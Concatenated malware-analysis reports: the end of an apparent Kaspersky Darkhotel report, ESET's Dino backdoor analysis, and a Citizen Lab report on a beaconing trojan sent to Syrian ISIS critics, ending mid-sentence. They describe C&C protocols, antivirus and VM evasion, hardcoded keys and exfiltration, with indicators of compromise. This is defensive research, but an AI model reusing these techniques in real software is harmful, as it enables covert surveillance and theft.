    appended to it.The appended data should be an IP address in plaintext.This
    is used a real C&C IP address.Reading stops when non­digit or dot symbol is
    found.Here is an example of shortest possible valid server response:
    HTTP/1.1 200 OK
    Content­Length: 17
    DEXT87192.168.1.1
2.Please note, that after receiving <DATA>, it is XORed with byte
     value 0x55 and saved to a disk in a file named «ctfmon.exe» (current directory
     is used).Upon successful receiving of the file it is started in a new process.Information Stealer
Filename      MD5                                  Link Time (UTC)           Linker

DmaUp3.exe 864cd4a59215a7db2740dfbe4a648053 2012.04.30                       6.0
                                                   00:25:59

This module is relatively large (455Kb) and comes as a part of WinRar SFX file
that drops and starts the module from %APPDATA%\Microsoft\Display\DmaUp3.exe.The main purpose of the module is to collect various secrets stored on a
local system.This module is designed not to run on Windows with system default
codepage set to Korean.Technical Details
From the very beginning this module checks if «bdagent.exe» process is running
on current system.Bdagent.exe is a name for BitDefender Antivirus component.If it is running, it uses simple AV heuristics evasion technique.The code starts a
thread that simulates keystrokes of ESC keyboard key and then shows a system
modal message box.Pushing ESC key closes the modal message box.Right after
that keystroke generation thread is terminated and the module continues normal
execution as if «bdagent.exe» was not running.Next the module makes sure only one instance of current code is running by
checking if system mutex object named «920111215» exists.There is one interesting specifics in Microsoft IntelliForms which reveals attack-
er’s interests.IntelliForms technology keeps login/password information in the
registry in encrypted form.However, there is no clear information about the corre-
sponding website which requires given login and password.The only information
Intelliforms offers about the place where given login/password should be used
is a hash of the webpage URL.So far, the attackers can steal logins and pass-
words but to understand where they are from they must guess the string which
produced given hash.They have implemented this logics in the malware.When
IntelliForms information is stolen the malware tries to check the list of known
login page URLs to recover the originating webpage address.String encryption/decryption functions use the following keys:
«Microsoft Corporation.All rights reserved.»
«90ed768ab728a0f74a4b957c31f1a213»

TLP: Green	               For any inquiries, please contact intelreports@kaspersky.com
                                                                                    63


The module works with all Firefox versions prior to Mozilla Firefox 12.0.Depend-
ing on version of Firefox, it can read Firefox database directly to dump stored se-
crets or utilize one Firefox libraries to access the configuration data.In addition it
makes use of the following Mozilla Firefox libraries depending on Firefox version:
•	 	nss3.dll
•	 	plc4.dll
•	 	mozcrt19.dll
•	 	mozutils.dll
•	 	mozglue.dll
•	 	mozsqlite3.dll
•	 	sqlite3.dll
•	 	nspr4.dll
•	 	plds4.dll
•	 	nssutil3.dll
•	 	softokn3.dll
When stealing secrets from Firefox and Chrome it uses built­in SQLite library code.The module is linked with SQLite version 3.7.5 release candidate 2, release
hash ed759d5a9edb3bba5f48f243df47be29e3fe8cd7 dated as 2011­01­28
17:03:50.After stealing secrets from local system the malware executes some kind of
embedded script.It is logging all actions to inform the operator what exactly was
executed by this variant of the malware.The result of this execution is appended
to the stolen data and uploaded to the C&C server.The module uploads all collected information to one of the following URLs via
POST request:
•	 	
•	 	
•	 	
•	 	
It’s the first time we see .pn domain used in malware.This top level country code
domain is quite exotic and is assigned to Pitcairn Islands, which is Overseas ter-
ritory of the United Kingdom in the Pacific.As of 2013 estimated population of
Pitcairn Islands is only 56 people.An official .pn domain costs $100/year from
the registry, however .eu.pn domains seem to be given away for free.TLP: Green	                For any inquiries, please contact intelreports@kaspersky.com
64


The malware uses fixed User­Agent string:
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2;
.NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Cen-
ter PC 6.0)
The data is uploaded as a POST request binary in the following format:
<UserId>;<UniqueMachineId>;<EncryptionKey>;<GeneralSysInfo>
where <UserId> is hardcoded identifier (i.e.«user2» in current sample);
<UniqueMachineId> is a 32 characters long hex string which derived from net-
work card MAC address; <EncryptionKey> is symmetrical encryption key used to
encrypt <UserId> and <GeneralSysInfo> values.The malware uses text protocol,
which is why potentially binary values of <UserId> and <GeneralSysInfo> are ad-
ditionally encoded using Base64 algorithm.<GeneralSysInfo> field contains only basic information about the system, i.e.:
Info;
Sys@User : MYCOMPUTER@MyUser (0850)
C P U : Intel(R) Core(TM) i3­1667U CPU @ 1600GHz
System OS: Microsoft Windows XP (Service Pack 3)
Net card : 192.168.0.2 (133773311337)
If the server reply contains a keyword «minmei» it continues sending additional in-
formation.«Minmei» may be a reference to a popular Japanese anime and manga
known as «The Super Dimension Fortress Macross».First, it checks if cur-
rent process is running in WOW64 environment.If yes it does additional port
I/O specific to VMWare virtual machine (the VMware hypervisor port: 0x5658;
VMware hypervisor magic value: 0x564D5868).Another method to detect VM en-
vironment is to check local network adapter’s IP address.If it belongs to subnet
192.168.100.* then the malware believes it’s running in a VM.If VM is detected
the process instantly terminates.Selective Infector
Technical Notes
Igfxext.exe can download a file and drop it to %APPDATA%\microsoft\dis-
play\ctfmon.exe (md5= e8bfb82b0dd5cef46116d61f62c25060).After
execution, the downloaded file drops SMAGENT.EXE (md5 0306f9ae-
7786570139f78e78bc940597) to %APPDATA%\MICROSOFT\DISPLAY and ex-
ecutes it.This component is a virus, and is used to selectively infiltrate into other
computers via USB or network shares.Trojan-Dropper & Injector (infected legitimate files)
Technical Notes
A large number of files are detected by Kaspersky Lab scanners as Virus.Win32.Pioneer.dx.These files are all legitimate files that have been infected by another
Darkhotel component.All of these infected files drop a 63kb self injecting compo-
nent.Filename      MD5                                  Link Time (UTC)          Linker

igfxext.exe   fcd2458376398b0be09eaa34f4f4d091     2012:07:27 17:10:30      6.0


This malware is 63kb in size.It is bound to a variety of other software packages
that vary in name, but the host package is consistently detected as “Virus.Win32.Pioneer.dx”.The igfxext.exe component is dropped to disk and run.It spawns an-
other suspended process with its own igfxext.exe image, but decrypts a smaller
32kb executable (cf1319d94f33380622ba000b7d8ad6e9,Trojan­Downloader.Win32.Agent.xwge) from its .data section in memory with a simple xor 0xbb.The
running process overwrites the igfxext.exe image in the suspended process with
this smaller chunk of code.It then resumes the thread in the new process.Enhanced Keyloggers and Development
Technical Notes
It is signed with the familiar “                                    ” digital certificate.77669d11c3248a6553d3c15cd1d8a60e ­csmrs.exe, 478.8kb,
CompliedOn:2010­11­11 08:46:47
Signed by                        certificate.This sample is started by code running within svchost.exe on WinXP SP3.It drops
a keylogger.It is installed as a system kernel driver “Ndiskpro” service, described as
a “Microcode Update Device”.It is somewhat surprising that there is no rootkit
functionality hiding this service:




TLP: Green	                 For any inquiries, please contact intelreports@kaspersky.com
                                                                                 69




When loaded, the NDISKPRO.SYS driver hooks both INT 0x01 and INT 0xff, and
retrieves keystroke data directly from port 0x60, the motherboard keyboard con-
troller itself.Here we see the local port variables assigned values




And here, the ports are directly being read with READ_PORT_UCHAR(0x64) and
then READ_PORT_UCHAR(0x60):




It buffers, then communicates the data to the running user mode component.This component then encrypts and writes the retrieved values ondisk to a ran-



TLP: Green	              For any inquiries, please contact intelreports@kaspersky.com
70


domly named .tmp, file like ffffz07131101.tmp.This file is located in the same
directory as the original dropper, which maintains persistence across reboots with
a simple addition to the HKCU run key.Here is debug output demonstrating this component’s data retrieval when the
letter “D” is repeatedly pressed on the keyboard.Keyscan make and break codes
are “0x20” and “0xA0” and for the key press and key release for the “D” key.This keylogger module encrypts and stores gathered data in a log file, as men-
tioned previously.Its encryption algorithm is similar to RC4.Interesting part is
that the module randomly generates the key and stores it in an unexpected place:
in the middle of the log file name.Hence, the numeric part of the filename is used
as a seed for the pseudorandom number generator.Rand function is statically
linked to insure same results on different computers.html?PID=6157500




TLP: Green	              For any inquiries, please contact intelreports@kaspersky.com
Kaspersky Lab HQ
39A/3 Leningradskoe Shosse
Moscow, 125212
Russian Federation

more contact details

Tel:	+7-495-797-8700
Fax:	+7-495-797-8709

E-mail:	 info@kaspersky.com
Website:	 www.kaspersky.comSecurity news, views and insight from the ESET experts

Dino – the latest spying malware from an
allegedly French espionage group analyzed

BY JOAN CALVET POSTED 30 JUN 2015 ­ 11:12AM

In this blog we describe a sophisticated backdoor, called Dino by its creators.We believe this malicious
software has been developed by the Animal Farm espionage group, who also created the infamous Casper,
Bunny and Babar malware.Dino contains interesting technical features, and also a few hints that the
developers are French speaking.Animal Farm is the security industry’s name for a group of attackers first described by Canada’s
Communications Security Establishment (CSE) in a set of slides leaked by Edward Snowden in March 2014.In those slides CSE assess with “moderate certainty” that this group is a French intelligence agency.Since
then, several examples of malware created by Animal Farm have been found and publicly documented, in
particular:

Casper, a stealthy first­stage implant, documented by ESET in last March
Bunny, a Lua­based backdoor, documented by Marion Marschalek (Cyphort)
Babar, an espionage platform, also analyzed by Marion Marschalek

The connection between those pieces of malware and the group described in CSE slides has been convincingly
established, for example by Paul Rascagnères (G Data).In this blog post we add a new piece to the puzzle with Dino, another malicious program belonging to Animal
Farm’s arsenal.Introduction

The sample of Dino documented in this blog post was used in 2013 against targets in Iran.The original means
of infection is unknown, though we believe Dino was installed by another program, as it contains an
uninstallation command without the corresponding installation procedure.Given the set of commands it can
receive, Dino’s main goal seems to be the exfiltration of files from its targets.The binary’s original name, “Dino.exe”, has been left visible by its authors, as was the case with Casper.Dino –
which could be referring to the pet character from The Flintstones cartoon show – was already mentioned in a
recent Kaspersky blog as a “full­featured espionage platform,” but no technical analysis has been published
yet.Roughly, Dino can be described as an elaborate backdoor built in a modular fashion.Among its technical
innovations, there is a custom file system to execute commands in a stealthy fashion, and a complex task­
scheduling module working in a similar way to the “cron” Unix command.Interestingly, the binary contains a lot
of verbose error messages, allowing us to see Dino’s developers’ choice of wording.Also, a few technical
artefacts suggest that Dino was authored by native French speakers.Dino Basics

Modules List

Dino has been developed in C++ and presents a well­defined modular architecture.The following array lists the
modules contained in this Dino binary; the module names are those assigned by the developers.Module

Name

PSM

CORE

Module Purpose

Encrypted on­disk copy for Dino

modules

Configuration storage

CRONTAB

Task scheduler

FMGR

File upload and download

manager

Command execution manager
CMDEXEC
CMDEXECQ Storage queue for commands to

execute

ENVVAR

Storage for environment

variables

Data Structure

Dino heavily relies on a custom data structure named “DataStore” by the Animal Farm developers.In particular,
all Dino’s modules store their content inside this structure, making its understanding one of the keys to
analyzing Dino.A DataStore is a map from string keys to values of 8 possible types, such as integers or strings.The
implementation of this data structure is based on a hash table.It means that to retrieve the value associated
with a key, one has to calculate the hash of the key to locate a bucket from which the value can be retrieved.Dino’s hash is a one­byte value calculated with a series of XOR operations on the key, and each bucket starts a
linked list containing key/value pairs.The code responsible for retrieving the value associated with a key is
shown in Figure 1.Figure 1

Finally, DataStore objects can be serialized in a custom format, which begins with the magic word “DxSx”.This
is used in particular by the PSM module to save the content of Dino modules in an encrypted file.More
precisely, when a modification is made to a module’s content in memory, the PSM module saves it as a
serialized DataStore.When Dino restarts, the module is deserialized from the file and loaded into memory.Funnily enough, the key serving to encrypt the file on disk is “PsmIsANiceM0du1eWith0SugarInside”.Configuration

Dino’s configuration is initially stored in a serialized DataStore object contained in a zip archive at the end of the
Dino binary.At runtime this object is deserialized and stored inside the CORE module.:D STR
jopcft4T:a.ini WIDESTR

While most of the keys have self­explanatory names, we would like to focus on the following keys:

“recID”: Animal Farms binaries contain an ID whose decimal value appears to identify the target, “11173­01­
PRS” in this case.For example Casper used an “ID” value set to “13001”, whereas some Babar samples
used “12075­01” and “11162­01”.We do not know the meaning of the “PRS” suffix added in the case of
Dino.“ComServer”: These keys contain the command and control (C&C) servers’ URLs.All the URLs were down
when we started our analysis.Those C&Cs were compromised legitimate websites, which is standard
operating procedure for Animal Farm.“Version”: Dino’s code version; here set to “1.2”, which is confirmed by the “din12” folder used in one of the
C&C URLs.For the record, a “d13” folder has been seen on another Animal Farm C&C (see “3.7 Calling
home” of Marschalek’s Babar report), indicating that Dino version 1.3 has also likely been deployed at
some point.“BD_Keys” and “CC_Keys” contain cryptographic keys to encrypt the network communications with C&C
servers.Their values start with the word “MAGICBOX”.The three last keys are displayed with obfuscated names (“xT0rvwz”, “tr4qa589” and “jopcft4T”) and store
parameters for the custom file system we will describe later.Commands

The following Table lists the commands accepted by this Dino binary with the names chosen by the developers.Each of those commands can take one or more arguments.Command

sysinfo

killBD

!The

files found are packed in an archive, which is then
scheduled for upload to the C&C using the FMGR

module.For
example, it can provide all files with a “.doc” extension, the size of which is bigger than 10 kilobytes, and that
were modified in the last 3 days.We believe this exfiltration of files to be Dino’s end goal.At startup Dino executes successively the commands stored in the “InitialCommands” field in its configuration;
in the sample we analyzed they are:

sysinfo
cominfos
!ipconfig /all
!ipconfig /displaydns
!tracert www.google.com

Those commands serve as a reconnaissance step for the operators.Their execution is managed by the
CMDEXEC module, the commands being stored in a queue inside the CMDEXECQ module.The result is
reported to the C&C server.After having described Dino’s basics, we are now going to dig into two particularly interesting components; first,
a custom file system used by the malware, and then the CRONTAB module in charge of task scheduling.RamFS: A Temporary File System

Dino contains a custom file system named “ramFS” by its developers.It provides a complex data structure to
store files in memory, each of them bearing a name corresponding to filenames used by usual file systems.RamFS also comes with a set of custom commands that can be stored in files and executed.It should be
noticed that ramFS is also present in other Animal Farm binaries (see attribution paragraph below), but since
we are unaware of previous analysis of ramFS, we are describing our findings here.Architecture

RamFS content is initially stored encrypted in Dino’s configuration under the key “xT0rvwz”, whereas the
corresponding RC4 key is stored under the key “tr4qa589”.Once the file system has been decrypted, it is
stored in memory as a linked list of 512­byte memory chunks, each one of them being individually RC4­
encrypted.When looking for a file in ramFS, each chunk is decrypted, processed and then re­encrypted.Hence
there are very few noticeable traces of ramFS during its use.Here are some high­level characteristics of this file system:

File names and file content are encoded in Unicode
File names length is limited to 260 characters
Once decrypted, file content is manipulated as chunks of 540 bytes
There is no metadata associated with the files

We could not find an existing file system matching the memory structures and the characteristics of ramFS, and
therefore we believe this file system to be an original creation of the Animal Farm group.Commands

Several commands can be executed in the context of ramFS, as listed in the following Table.The developers named this file the “cleaner” and it is executed when
Dino receives the command “killBD” (the “BD” acronym is the developers’ designation of the malware).Figure 2 shows the code responsible for executing this cleaner file.First, it retrieves the name of the file from
Dino’s configuration (“a.ini”), then it retrieves the key to decrypt ramFS, and it finally mounts the file system in
memory in order to execute the cleaner file stored inside.The verbosity of the error messages makes it
particularly easy to understand the purpose of the code.Figure 2

The cleaner file contains the string “INSTALL ­A “wusvcd” ­U” which, once executed, will uninstall the malware
from the machine – “wusvcd” being the name used to register Dino on the machine.Hence, ramFS serves as a protected container for files to be executed on the machine, offering a disposable
execution environment to the operators and leaving very few traces on the system.Tasks scheduling in a Unix fashion

The commands “cronadd”, “cronlist” and “crondel” serve respectively to add, list, and remove scheduled tasks
registered in the CRONTAB module.Those tasks are Dino’s commands.The syntax to define scheduled tasks is similar to the one used by the cron Unix command.In particular the
time at which to run a command is given by a string following the format “minute hour day month year
dayofweek”.Alternatively, this string can be replaced by “@boot” for a command to run at each startup –
whereas some Unix cron implementations accept “@reboot”.As an example, here is the output of the “cronlist” command after a “wakeup” command has been scheduled to
run on 7th April 2015 at 15:44:

As we can see, each entry is identified by an “Id”, an incrementing hexadecimal number starting at 0xC0.The
purpose of the “Local” field remains unclear (the other possible value being “­l”).The “Count” parameter counts
the number of times a command has been executed, “­1” indicating the command will be executed only once.Finally, the “Visibility” field defines whether the command execution will be reported to the C&C (the other
possible value being “Silent”).Attribution

Dino Belongs To The Farm

The amount of shared code between Dino and known Animal Farm malware leaves very little doubt that Dino
belongs to Animal Farm’s arsenal.Among these shared features, we can cite the following:

At the very beginning of Dino execution, the current process name is checked against process names used
by some sandboxes:

Figure 3

A very similar check (against “klavme”, “myapp”, “TESTAPP” and “afyjevmv.exe”) is present in Bunny samples,
and in some first­stage implants deployed by Animal Farm.To hide its calls to certain API functions, Dino employs a classic Animal Farm ploy: a hash is calculated from
the function’s name and used to look for the address of the API function.The actual hashing algorithm used

in Dino is the same that was used in Casper, namely a combination of rotate­left (ROL) of 7 bits and
exclusive­or (XOR) operations.The Dino’s custom file system – the so­called ramFS – is present in several droppers used by Animal Farm.In those binaries the file system serves to set the persistence of the payload.French speaking Developers

Dino adds at least two more indicators to those already documented suggesting that Animal Farm developers
are French speaking:

Dino’s binary contains a resource whose language code value is 1036.The original purpose of this language
code is to allow developers to provide resources (menus, icons, version information…) for different locations
in the world in the corresponding language.Interestingly, when a developer does not manually specify the
language code, the compiler sets it to the language of the developer’s machine.So, which language
corresponds to the value 1036, or 0x40c in hexadecimal?French (France).Of course a non­French speaking developer could have deliberately set this value to mislead attribution efforts.But in more recent Animal Farm binaries (for example Casper), this language code has been set to the classical
English (USA) language code.Therefore, it seems that Animal Farm developers forgot to set this value in their
first creations, realized their mistake at some point, and decided to set a standard value.Someone using the
language code as a false flag would have likely kept the strategy going.For the record, this Dino sample is not the only Animal Farm binary with 1036 as language code.Dino’s binary is statically linked with the GnuMP library, which is used to manipulate big numbers in
cryptography algorithms.The GnuMP code in Dino contains file paths coming from the developer’s machine:

..\..\src\arithmetique\mpn\mul.c
..\..\src\arithmetique\printf\doprnt.c
..\..\src\arithmetique\mpn\tdiv_qr.c
..\..\src\arithmetique\mpn\mul_fft.c
..\..\src\arithmetique\mpn\get_str.c

As the attentive reader has probably guessed, “arithmetique” is the French translation of “arithmetic”.Conclusion

Dino’s binary shows an intense development effort, from custom data structures to a homemade file system.As
with other Animal Farm binaries, it bears the mark of professional and experienced developers.But Dino also shows a poor knowledge, or interest, from these developers in anti­analysis techniques – contrary
to what was seen in Casper – as demonstrated, for example, by the verbosity of some Dino’s log messages:

All those messages provide substantial help in understanding Dino’s internal workings.One will also appreciate
the numerous misspellings contained in the messages.Regarding Dino’s victims, we know very little except that they were located in Iran in 2013.This is in
accordance with the victimology described by Canada’s CSE in its presentation:

That leads us to the final point of this blog: several signs suggest that Dino’s creators are French speaking
developers.These signs add to the pretty long list of indicators already supporting this hypothesis, in particular
the ones mentioned by Canada’s CSE.Indicators of Compromise

Value
BF551FBDCF5A982705C01094436883A6AD3B75BD
hXXp://www.azhar.bf/modules/mod_search/found/cache/postal.php
hXXp://www.rsvniima.org/templates/rsv/icons/din12/postal.php
hXXp://dneprorudnoe.info/sxd/lang/i18n/charcodes/postal.php
C:\Program Files\Common Files\wusvcd\wusvcd.exe
C:\Program Files\Common Files\wusvcd\wusvcd00000000­0000­
0000­0000­0000­00000000.{dax,dat,lck}

.tmp_dwn

Software\Microsoft\Windows\Windows\CurrentVersion\Run\wusvcd

Indicator
Sample SHA1
C&C URL
C&C URL
C&C URL
Path
Default storage file
names
Downloaded file
name extension
Registry key

 

Author Joan Calvet, ESETMalware Attack Targeting Syrian ISIS Critics
by John Scott-Railton and Seth Hardy

With the collaboration of Cyber Arabs.Media coverage: Associated Press, Forbes

Summary

This report describes a malware attack with circumstantial links to the Islamic State in Iraq and Syria.In the interest of
highlighting a developing threat, this post analyzes the attack and provides a list of Indicators of Compromise.A Syrian citizen media group critical of Islamic State of Iraq and Syria (ISIS) was recently targeted in a
customized digital attack designed to unmask their location.The Syrian group, Raqqah is being Slaughtered
Silently (RSS), focuses its advocacy on documenting human rights abuses by ISIS elements occupying the city of Ar-
Raqah.In response, ISIS forces in the city have reportedly targeted the group with house raids, kidnappings, and an
alleged assassination.The group also faces online threats from ISIS and its supporters, including taunts that ISIS is spying
on the group.Though we are unable to conclusively attribute the attack to ISIS or its supporters, a link to ISIS is
plausible.The malware used in the attack differs substantially from campaigns linked to the Syrian
regime, and the attack is focused against a group that is an active target of ISIS forces.Background: Citizen Journalists under Threat in ISIS-controlled Territories

As the Syrian Civil War continues, Syrian citizen journalists and nonviolent activists operate in an increasingly unsafe
environment.The regime has never welcomed their work, and has often targeted them for arrest and detention, and a
multi-year hacking campaign (see Pro-Regime / Regime Linked Groups).Additionally, not all elements of the Syrian
opposition have uniformly supported nonviolent activists and citizen journalists.More recently, in areas like Raqqah,
nonviolent activists face a new and exceptionally grave threat: ISIS.A growing number of reports suggest that ISIS is
systematically targeting groups that document atrocities, or that communicate with Western media and aid organizations,
sometimes under the pretext of finding “spies”.Map: Raqqah is indicated by the red arrow.Colors indicate areas mostly under the control of the following groups:
Black = ISIS, Red = Syrian Regime, Green = Free Syrian Army, Yellow = Kurdish.Note: the map is not highly detailed,
nor completely up-to-date, but is useful in showing general areas of control.Source: @DeSyracuse

Ar-Raqqah, the city in which the case study is located, is situated in northern Syria and continues to be a key conflict
flashpoint of the Syrian Civil War.In the spring of 2013, Islamists and Free Syrian Army (FSA) fighters took over Ar-
Raqqah from regime forces.As ISIS gained momentum, they consolidated their control over the city, edging out FSA-
affiliated groups through attacks, summary executions, and kidnappings against a range of groups, including ethnic and
religious minorities.Information Control by ISIS

During 2014, there were a number of reports—many unconfirmed—that ISIS confiscated smartphones and laptops from
captured activists.According to Syrians who experienced these searches and spoke with one of the reports’ authors, ISIS
sometimes extracts data from confiscated smartphones and laptops to collect information about people and groups they
are targeting, as well as to seek evidence of “un-Islamic” activities.As ISIS cements their control of Ar-Raqqah and other territories, reports have emerged recently (though not all of them
confirmed) suggesting that elements within ISIS are growing increasingly sophisticated at imposing control and targeting
opponents using digital methods.Reports about ISIS targeting Internet cafés have grown increasingly common, and in
some cases reports point to the possible use of keyloggers as well as unspecified “IP sniffers” to track behaviour in Internet
cafes.The Situation of Nonviolent Activists and Citizen Journalists in Ar-Raqqah

Nonviolent activists and citizen journalists based in Ar-Raqqah have provided the outside world with much of what we
know about how ISIS treats the population.These activists and journalists face mortal danger for their actions, and
reports have emerged of their detention and torture at the hands of ISIS.As ISIS continues to use social media to push the message that it is welcomed by the population of Ar-Raqqah, groups like
Raqqah is being Slaughtered Silently (RSS) provide a compelling counter narrative.RSS hasn’t escaped ISIS’ notice, and
the group has been targeted for kidnappings, house raids, and at least one alleged targeted killing.At the time of writing,
ISIS is allegedly holding several citizen journalists in Ar-Raqqah.Image 1: Example of an online threat made against RSS.The image, which cannot be confirmed, purports to show CCTV
installed around Raqqah.In addition, RSS is targeted online by ISIS supporters with harassment, including threats to the physical safety of its
members.For example, ISIS supporters have claimed that ISIS has established a system of CCTV cameras in Ar-Raqqah to
observe residents’ movements.While this claim may be a bluff or exaggeration, at least one ISIS supporter has indicated
on social media that this system could be used to look for members of RSS.Analyzing the Attack

This section describes a highly targeted attack sent to an e-mail address belonging to RSS.The Citizen Lab analyzed this
attack with the consent of RSS, which requested that their name be used in this report.The attack took the form of an unsolicited e-mail containing a download link to a decoy file.The file
contained custom malware that profiled the victim’s computer and beaconed its IP address to an e-mail
account under the attacker’s control.The Targeting of RSS

The unsolicited message below was sent to RSS at the end of November 2014 from a Gmail email address.The message
was carefully worded, and contained references specific to the work and interests of RSS.Targeting Email

Thank you for your efforts to deliver a true picture of the reality of life in Raqqah.As Syrians residing in Canada we are
working with media because we believe in the importance of shedding light on the realities of life in Syria, and Raqqah in
particular.We are preparing a lengthy news report on the realities of life in Raqqah.We are sharing some information
with you with the hope that you will correct it in case it contains errors.We have prepared a map of the city of Raqqah, in
addition to a preliminary report.We hope that you have a look at it with them and inform us of any errors.We also hope
that if you happen to be on Facebook, you could provide us with the account of the person responsible for the campaign, if
you don’t mind, so that we can communicate with him directly.However, it is well known that Syria’s
extensive diaspora (including in Canada) regularly engages in advocacy, sometimes in coordination with groups within
Syria.Thus, the message is not on its face implausible.However, we note that the attacker also attempts to social
engineer the identity of individuals working with RSS, by requesting a personal Facebook page.Analyzing the Malware

The custom malware used in this attack infects a user who views the decoy “slideshow,” and beacons home with the IP
address of the victim’s computer and details about his or her system each time the computer restarts.Unlike Syrian regime-linked malware, it contains no Remote Access Trojan (RAT) functionality,
suggesting it is intended for identifying and locating a target.Further, because the malware sends data captured by the malware to an e-mail address, it does not require that the
attackers maintain a command-and-control server online.This functionality would be especially useful to an adversary
unsure of whether it can maintain uninterrupted Internet connectivity.Narrative of Infection

Accessing the link provided in the malicious e-mail sends the user to a .zip file hosted on file-sharing site
tempsend.com.At the time of writing the file had been downloaded only 10 times
Image 2: Tempsend screenshot

The file to be downloaded is “slideshow.zip”

MD5: b72e6678e79cc57d33e684528b5721bd

This file contains slideshow.exe

MD5: f8bfb82aa92ea6a8e4e0b378781b3859

This file is a self-extracting archive with an icon intended to suggest to the victim that it is itself a slideshow.When run, the file opens a slideshow of Google Earth screen captures to the victim, displaying a series of locations in
Syria, and highlighting an “ISIS HQ” and other images showing the alleged locations of US airstrikes.Examples of images in the slideshow as follows:
Infection and Data Collection

When opened, the “slideshow.zip” file writes and executes several files:

C:\Users\[Username]\AppData\Local\Temp\IXP000.TMP\AdobeR1.exe C:\Users\
[Username]\AppData\Local\Temp\IXP000.TMP\pictures.exe

“AdobeR1.exe” is malicious, while “pictures.exe” is the genuine slideshow displayed to the victim.When the slideshow is
closed both AdobeR1.exe and pictures.exe are deleted.Programs appear to make use of the Visual C++ Runtime Library.“0x3110x611”

It then runs GooglUpd, which cleans up the program files if they exist, and runs AdbrRader.AdbrRader
(communicating through registry key “2”) writes the file vgadmysadm.tmp with the name of another registry key “2” with
startup info.It then runs rundl132 if it has not before, by checking whether registry key name “6” is present.It sets the key to “0” and
runs it.Program “AdobeIns.exe” takes the files written by the other programs and zips them in an encrypted, password-
protected file:

C:\Users\[Username]\AppData\Local\Microsoft\Windows\win32.tmp\drv.sys\mxtd

Data Transmission

Data is transmitted by e-mail to an account presumably controlled by the attacker.AdobeIns connects to an account at the online e-mail provider inbox.com via smtp using hardcoded credentials.The
malware then sends an e-mail to the same inbox containing the text “Hello” and with mxtd file attached.SMTP traffic generated by the malware to inbox.com (with redactions)

220 [REDACTED]ESMTP Postfix
EHLO [REDACTED]
250-[REDACTED]
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
MAIL FROM:< [REDACTED]@inbox.com>
250 2.1.0 Ok
RCPT TO:< [REDACTED]@inbox.com>
250 2.1.5 Ok
DATA
354 End data with .250 2.0.0 Ok: queued as [REDACTED]
QUIT
221 2.0.0 Bye

Evaluation of the Malware’s Functionality

The malware seen in this case study is unusual as it relies on a half-dozen separate executable files, each with a
single task, and each communicating via markers dropped in the Registry.The malware is also interesting because it does not provide remote access, but only sends an e-mail containing
the victim’s IP address and miscellaneous system information.The malware resends the information each time
the computer is restarted, but it does not refresh the sent information on restart (which may be a bug).This behaviour
strongly suggests that the function of this malware is to serve as a beacon.The system information could be used to
identify processes to exploit in the future, however since the attacker has already triggered the execution of a file on the
victim’s system, it is surprising that more was not taken, or that a RAT (custom or widely available) was not used.A RAT
would have provided much greater access alongside IP information

By not providing remote access and other RAT functionality, the program looks less like malware, and may attract less
attention from endpoint protection tools and scanners.Detections were low when the file was first submitted to
VirusTotal, for example.It registered only 6/55 detections by anti virus scanners, or a 10% detection rate.Transmitting the malware via e-mail also provides a degree of obscurity, and has the additional advantage of providing a
layer of abstraction between the attacker and the target: there is no need to maintain a RAT command-and-control server.The malware transmits autonomously, leaving the material in an inbox for the attacker to collect at a later time.The malware has no obfuscation processes and is not highly technical in its development or interaction with Windows.Nevertheless, we believe that the author of the program is aware of certain techniques to reduce the visibility of malware
on a network, including transmitting data via encrypted e-mail communications.However, the attacker has not correctly
implemented encrypted e-mail: the malware will not attempt to use a TLS connection in certain cases.As a result, account
login credentials may be readily available in network traffic.In addition, the malware uses the old PKWARE implementation of zip encryption, which is not particularly secure.The
password for the zipped file is also present in the binary without encryption or obfuscation.Targeted Threats Index
Citizen Lab researchers have developed the Targeted Threat Index (TTI) as a tool to standardize information about the
sophistication of targeted threats against civil society groups in our research.The index captures information about the
level of social engineering used (“Targeting Sophistication”), and adds a Technical Sophistication value for the attack as a
multiplier.This attack, which has little technical sophistication (i.e., it uses no exploits, code obfuscation, or techniques to frustrate
reversing, etc.), nevertheless has carefully developed social engineering in the seeding materials and bait document.Taken
together it rates a 3 for Targeting Sophistication and a 1.25 for Technical Sophistication by our metric, yielding a TTI score
of 3.75.Citizen Lab research using the TTI has found that, despite low levels of technical sophistication, with well-crafted
social engineering malware attacks remain highly effective against civil society groups.More information is available
about the TTI in a recent Usenix Security paper.Attribution

There are at least three possible sources for this malware attack:

      Pro-regime / regime-linked malware groups
      ISIS-linked hackers
      Other, unknown actors

We evaluate each of these possibilities in turn, drawing on the information available to us after almost three years of
tracking regime-linked malware.Pro-Regime / Regime-Linked Groups

Pro-regime malware actors have continually targeted the Syrian opposition with waves of malware since at least late 2011.Those campaigns have been extensively reported on by a range of groups, including Kaspersky, FireEye, Citizen Lab, the
Electronic Frontier Foundation, and many others.Regime-linked malware has a number of common features that
typically serve as distinguishing characteristics:

      Social engineering focusing on the needs and interests of the opposition.Although targeted, the malware seeding
      often aims at classes of people (e.g., people interested in ‘shocking’ news about a fighter, or ‘leaked’ information
      about the Assad regime) rather than carefully written spear phishing targeting a single individual or small group.Use of widely available RATs (njRAT, Xtreme Rat, ShadowTech Rat, DarkComet RAT, and Blackshades RAT, among
      others).At least one command-and-control server located within Syrian IP space (often from a limited range of addresses).Frequent use of Dynamic DNS providers like no-ip.Use of “crypters” to obscure the binary.These characteristics are not all present in every sample, but we have typically found one or more in almost every binary
we have examined that is Syrian regime-linked.This malware attack differs from known regime-linked groups in each of these elements.Not only is it
exceptionally targeted, but it is also not a commonly available RAT.Nor does it have RAT functionality.The function of
the malware appears to be: identify and unmask the IP address of target(s), and resend them to the attacker with each
reboot.In addition, data is sent to an Internet e-mail address, and no crypter is used to obscure the binary.We are aware of only one previous case in Syria in which e-mail was used to transmit data, and that we believed was
regime linked.That incident, observed in 2012, also used hardcoded e-mail to exfiltrate.However, that malware had
substantially more functionality than this case: not only did it drop a second stage from a compromised site, but was also
included a mechanism for exfiltrating credentials from Facebook and hooking programs like Skype.The lack of overlap in Tactics, Techniques, and Procedures (TTPs) between this attack and prior attacks does not rule out
Syrian regime-linked attackers.It is possible that regime-linked groups are trying a new approach.However, given that
known regime-linked groups continued to remain active during the same date range using familiar TTPs, this scenario
seems unlikely.In addition, it would be strange for regime-linked malware groups to undertake significant effort to
